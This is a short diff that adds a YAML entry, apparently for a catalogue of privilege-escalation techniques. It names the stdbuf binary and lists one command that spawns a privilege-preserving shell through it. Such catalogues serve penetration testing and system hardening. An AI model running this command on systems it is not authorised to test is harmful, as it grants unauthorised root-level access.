@@ -1,0 +1,4 @@
+name: stdbuf
+binary_path: /usr/bin/stdbuf
+exploit_cmds:
+- /usr/bin/stdbuf -i0 /bin/sh -p
